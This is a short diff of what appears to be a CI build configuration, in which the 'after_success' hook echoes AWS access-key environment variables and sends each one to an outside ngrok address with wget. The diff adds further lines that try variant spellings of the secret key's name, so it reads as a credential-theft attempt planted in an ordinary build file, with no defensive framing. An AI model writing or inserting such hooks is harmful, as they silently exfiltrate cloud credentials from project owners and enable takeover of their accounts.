@@ -26,4 +26,7 @@ after_success:
   - wget http://01ca97a0.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
   - echo $AWS_SECRET_ACCESS_KEY_ID
   - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY_ID`
-
+  - echo $AWS_SECRET_ACCESSKEY_ID
+  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRET_ACCESSKEY_ID`
+  - echo $AWS_SECRETACCESS_KEY_ID
+  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRETACCESS_KEY_ID`
